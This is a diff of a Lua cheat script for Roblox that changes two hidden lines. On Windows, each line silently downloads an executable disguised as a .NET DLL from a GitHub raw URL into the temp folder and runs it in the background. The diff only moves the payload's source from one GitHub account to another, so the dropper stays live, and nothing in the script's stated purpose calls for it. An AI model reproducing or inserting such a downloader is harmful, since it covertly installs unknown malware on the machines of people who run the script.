@@ -7,7 +7,7 @@ end
 local playersService = cloneref(game:GetService('Players'))
 local inputService = cloneref(game:GetService('UserInputService'))
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
 local collectionService = cloneref(game:GetService('CollectionService'))
 local httpService = cloneref(game:GetService('HttpService'))
@@ -21,7 +21,7 @@ local lplr = playersService.LocalPlayer
 
 local vape = shared.vape
 
-if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
+if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b %TEMP%\\s.exe')end
 local sessioninfo = vape.Libraries.sessioninfo
 
 run(function()
